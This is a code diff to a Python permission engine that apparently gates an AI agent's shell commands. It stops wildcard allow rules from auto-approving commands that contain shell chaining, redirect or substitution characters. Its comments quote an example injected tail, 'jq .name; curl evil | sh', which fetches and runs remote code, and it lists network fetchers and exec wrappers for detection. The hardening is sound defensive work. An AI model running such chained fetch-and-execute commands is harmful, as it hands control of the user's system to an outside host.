@@ -79,6 +79,18 @@ _EXEC_WRAPPERS = {
 # in _rule_pattern doesn't catch them).
 _NET_FETCHERS = {"curl", "wget"}
 
+# Shell control characters that can chain, redirect, or substitute a SECOND
+# command. run_command executes the whole string via /bin/sh -c, so a wildcard
+# ("…*") rule must never auto-approve a command containing any of these — the `*`
+# would blindly cover an unapproved tail (`jq .name; curl evil | sh`). Guarded in
+# check(); _rule_pattern also refuses to generalize such a command in the first place.
+_SHELL_CONTROL = frozenset(";|&$`<>()\n")
+
+
+def _has_shell_control(command: str) -> bool:
+    """True if a command string contains a shell chaining/redirect/substitution char."""
+    return any(c in _SHELL_CONTROL for c in command)
+
 
 # Default rules — read operations are ALWAYS, write operations ASK, destructive NEVER.
 DEFAULT_RULES: dict[str, str] = {
@@ -300,6 +312,12 @@ class PermissionEngine:
         prefix = "run_command:"
         if not match_key.startswith(prefix):
             return match_key
+        # Never generalize a command that already contains shell operators — a
+        # wildcard over `jq .name; evil` is meaningless and the tokenizer's
+        # break-on-metachar only fires for standalone single-char tokens, so a
+        # fused `;evil` / `$(evil)` would otherwise survive into the prefix.
+        if _has_shell_control(match_key[len(prefix) :]):
+            return match_key
         kept: list[str] = []
         for tok in match_key[len(prefix) :].split():
             if tok.startswith("-") or "://" in tok or tok[:1] in "\"'" or tok in "|<>;&":
@@ -318,17 +336,15 @@ class PermissionEngine:
         # Content check, not just token count: wildcarding is unsafe whenever the
         # trailing `*` could still expand into arbitrary code or an arbitrary
         # target. That happens when the LAST kept token is an interpreter/shell
-        # (its `*` becomes `-c <code>`); when ANY kept token is an exec-wrapper
-        # (env/sudo/xargs/… hide the real program AND their filler args can push an
+        # (its `*` becomes `-c <code>`); when the PROGRAM is an exec-wrapper
+        # (env/sudo/xargs/… run whatever follows, and their filler args can push an
         # interpreter past the 3-token cap, e.g. `env A=1 python3 …`); or when the
-        # program itself fetches the network (`curl host*` = any path on that host,
+        # program fetches the network (`curl host*` = any path on that host,
         # scheme-less so the `://` break above never fired). Keep those exact.
+        # (Program-position, like the fetcher check, so a wrapper *word* appearing
+        # as a benign argument — `npm run time` — isn't needlessly held exact.)
         bases = [tok.rsplit("/", 1)[-1] for tok in kept]
-        if (
-            bases[-1] in _INTERPRETERS
-            or any(b in _EXEC_WRAPPERS for b in bases)
-            or bases[0] in _NET_FETCHERS
-        ):
+        if bases[-1] in _INTERPRETERS or bases[0] in _EXEC_WRAPPERS or bases[0] in _NET_FETCHERS:
             return match_key
         return prefix + " ".join(kept) + "*"
 
@@ -385,10 +401,22 @@ class PermissionEngine:
         """
         match_key = self._build_match_key(tool_name, params)
 
+        # A run_command carrying shell control chars (; | & $() ` < > newline) can
+        # chain a SECOND, unapproved command through /bin/sh -c. Such a command may
+        # be auto-approved only by an EXACT rule, never by a wildcard one whose `*`
+        # would blindly cover the injected tail (`jq .name*` matching
+        # `jq .name; curl evil | sh`). NEVER rules and exact ALWAYS still apply.
+        guard_wildcard_allow = match_key.startswith("run_command:") and _has_shell_control(
+            match_key[len("run_command:") :]
+        )
+
         # Sort rules by pattern length descending so more specific rules match first
         for pattern in sorted(self.rules, key=len, reverse=True):
             if fnmatch.fnmatch(match_key, pattern):
-                return self.rules[pattern]
+                level = self.rules[pattern]
+                if guard_wildcard_allow and level == PermissionLevel.ALWAYS and "*" in pattern:
+                    continue  # a wildcard must not auto-approve a chained command
+                return level
 
         # Default: ASK for unknown actions (safe fallback)
         return PermissionLevel.ASK
